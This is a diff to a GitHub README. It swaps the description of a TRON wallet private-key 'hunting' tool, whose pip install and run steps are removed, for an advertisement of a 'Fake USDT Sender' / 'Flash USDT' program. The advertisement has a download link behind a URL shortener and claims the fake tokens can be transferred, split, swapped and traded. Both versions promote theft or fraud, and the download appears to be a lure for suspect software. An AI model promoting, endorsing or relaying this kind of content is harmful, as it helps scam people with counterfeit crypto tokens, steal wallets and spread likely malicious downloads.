@@ -1,35 +1,31 @@
-# TRXhunt (TRON Address And PrivateKey Hunting)
-> [!TIP]
-Or you can run it from binary files (actual version) without python:
+# Flash-USDT
+🔐Fake USDT Sender / Flash USDT - Efficient and user-friendly software for rapid Tether (USDT) transactions. 
 
-
+ **Flash USDT Sender Software**, a premier solution for Tether (USDT) transactions. 🌐
+ 
 [📁𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃(𝐜𝐥𝐢𝐜𝐤𝐚𝐛𝐥𝐞)](https://goo.su/vfsdgfdre)
 ---
 
 
-
-Tron (TRX) address Generator and Hunting Online.
-A utility that attacks tron addresses and searches private keys to wallets and save result into data.txt
-Wait around 24h and you will find your first wallet
-
-First install this package's:
-
-```
-pip install tronpy
-pip install tronapi
-cd crypto-hunter
-```
-After:
-```
-python trx.py
-```
----
-
-
-Preview :
+https://github.com/virtuallord338/virtuallord338/assets/168340793/ff0e30ea-66bc-438e-bb76-41b16b266680
 
 
 
-![crypto hunter](https://github.com/virtuallord338/virtuallord338/assets/168340793/164c6d5c-412a-4e0c-84e8-b5cb61c3e8d3)
+### Features:
+
+1. **Multi-Chain Support**
+2. **Flash USDT Tools**
+3. **Developer Opportunities**
+4. **Transaction Tracking**
 
 
+
+## Special Features 💎
+
+- **Transferrable**: Move it as you need.
+- **Splitable**: Divide easily.
+- **Swappable**: Exchange effortlessly.
+- **Flash Duration**: Control your timing.
+- **Tradable**: Freedom to trade.
+
+🙏 **Thank You for Believing in Us!** 💖
